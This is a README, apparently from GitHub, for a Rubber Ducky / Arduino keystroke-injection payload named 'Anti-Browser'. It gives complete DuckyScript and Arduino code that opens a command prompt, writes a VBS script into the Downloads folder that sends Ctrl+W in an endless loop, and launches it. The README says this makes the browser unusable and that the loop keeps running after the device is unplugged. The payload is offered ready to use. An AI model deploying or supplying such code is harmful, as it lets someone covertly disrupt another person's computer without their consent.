# Anti-Browser
This script creates a vbs file that sends CTRL+W over and over very fast and, therefore, it will be impossible to use the browser. Furthermore, you can unplug the Rubber Ducky after the vbs is executed, because the thing that sends the keystrokes is the vbs file and not the Ducky.
<h2>About...</h2>

Version: 1.0

Author: <a href="https://github.com/BlueArduino20">BlueArduino20</a>

Time needed to complete the script injection: about 1.5 seconds!


<h2>Code for Rubber Ducky</h2>

<pre><code>ESC
DELAY 500
GUI r
DELAY 200
STRING cmd
ENTER
DELAY 200
STRING cd %userprofile%/Downloads
ENTER
STRING copy con CW.vbs
ENTER
STRING do
ENTER
STRING Set objShell = CreateObject("WScript.Shell")
ENTER
STRING WScript.Sleep 800
ENTER
STRING objShell.SendKeys "^{W}"
ENTER
STRING loop
CTRL z
DELAY 100
ENTER
STRING start CW.vbs && exit
ENTER
</pre></code>

<h2>Code for Arduino</h2>

<pre><code>#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(200);

  Keyboard.print("cmd");

  typeKey(KEY_RETURN);

  delay(200);

  Keyboard.print("cd %userprofile%/Downloads");

  typeKey(KEY_RETURN);

  Keyboard.print("copy con CW.vbs");

  typeKey(KEY_RETURN);

  Keyboard.print("do");

  typeKey(KEY_RETURN);

  Keyboard.print("Set objShell = CreateObject(\"WScript.Shell\")");

  typeKey(KEY_RETURN);

  Keyboard.print("WScript.Sleep 800");

  typeKey(KEY_RETURN);

  Keyboard.print("objShell.SendKeys \"^{W}\"");

  typeKey(KEY_RETURN);

  Keyboard.print("loop");

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('z');
  Keyboard.releaseAll();

  delay(100);

  typeKey(KEY_RETURN);

  Keyboard.print("start CW.vbs && exit");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}</pre></code>
